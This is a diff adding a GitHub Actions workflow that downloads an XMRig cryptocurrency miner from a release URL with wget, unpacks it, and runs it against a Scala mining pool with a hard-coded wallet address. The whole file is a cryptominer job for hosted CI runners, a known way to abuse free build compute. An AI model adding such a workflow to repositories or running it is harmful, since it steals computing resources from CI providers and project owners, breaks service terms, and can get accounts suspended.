@@ -1,0 +1,23 @@
+name: Mine Scala (Binary Download)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Download XMRig for Scala
+      run: |
+        wget https://github.com/scala-network/official-miner/releases/download/v5.11.3/xmrig-panthera-linux.tar.gz
+        tar -xzf xmrig-panthera-linux.tar.gz
+        chmod +x xmrig
+
+    - name: Start Mining
+      run: ./xmrig -o pool.scalaproject.io:3333 \
+                   -u Ssy2SFtR3rGfjKFA4xxUnGVikpSy7GyfTFbDmjyqSGsuJMJ4K2GSKyK6pApbCy7DBGgf6b5p3fHwV1zHrnVRUjDG7kdm496A8R \
+                   -p x -a panthera -t 2
